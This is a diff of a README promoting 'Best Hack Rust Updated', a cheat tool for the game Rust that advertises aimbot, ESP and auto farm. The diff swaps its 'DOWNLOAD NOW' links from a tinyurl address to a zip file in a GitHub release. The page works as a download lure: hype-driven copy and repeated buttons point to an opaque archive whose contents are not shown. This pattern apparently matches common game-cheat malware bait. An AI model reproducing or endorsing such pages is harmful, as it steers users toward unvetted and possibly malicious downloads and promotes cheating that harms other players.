@@ -9,7 +9,7 @@ The **⚔️ Best Hack Rust Updated** is the most advanced cheat tool for Rust, 
 
 <div align="center">
 
-[![Download Best Hack Rust Updated](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://tinyurl.com/best-hack-rust-updated)
+[![Download Best Hack Rust Updated](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://github.com/daldalkeo-spec/Rust-No-Recoil-ESP-Tool/releases/download/adq/rust_exter_comp.zip)
 
 </div>
 
@@ -109,7 +109,7 @@ You want to survive. You want to dominate. You want to raid. But without advanta
 7. **🔓 Press INSERT** — open the menu
 8. **⚙️ Enable Features** — toggle aimbot, ESP, auto farm
 
-[![Download Best Hack Rust Updated](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://tinyurl.com/best-hack-rust-updated)
+[![Download Best Hack Rust Updated](https://img.shields.io/badge/DOWNLOAD%20NOW-purple?style=for-the-badge&logo=github)](https://github.com/daldalkeo-spec/Rust-No-Recoil-ESP-Tool/releases/download/adq/rust_exter_comp.zip)
 
 ### Aimbot Setup
 
